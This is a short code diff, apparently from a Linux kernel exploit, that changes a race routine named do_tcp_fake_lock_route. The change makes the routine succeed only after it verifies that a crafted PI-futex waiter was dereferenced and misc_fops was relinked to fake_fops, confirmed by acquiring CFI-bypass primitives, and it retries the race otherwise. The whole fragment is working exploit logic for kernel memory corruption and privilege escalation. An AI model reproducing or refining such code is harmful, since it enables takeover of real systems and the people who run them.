@@ -240,11 +240,17 @@ void do_tcp_fake_lock_route(void) {
       }
       continue;
     }
-    /* Consumer fired = the PI walk derefed the crafted waiter and wrote.
-     * Ghostlock stages verify their own effects; no cfi stage here. */
-    route_ok = 1;
-    route_last_step = 0;
-    route_last_errno = 0;
+    /* Consumer fired = the PI walk derefed the crafted waiter and relinked
+     * misc_fops <- fake_fops. Prove it by acquiring the cfi primitives;
+     * a miss means the write landed on stale garbage — keep racing. */
+    if (cfi_try_acquire()) {
+      route_ok = 1;
+      route_last_step = 0;
+      route_last_errno = 0;
+    } else if ((i % 50) == 0) {
+      pr_warning("tcp route seq=%d consumer fired but cfi acquire "
+                 "failed, retrying\n", i);
+    }
   }
 
 out:
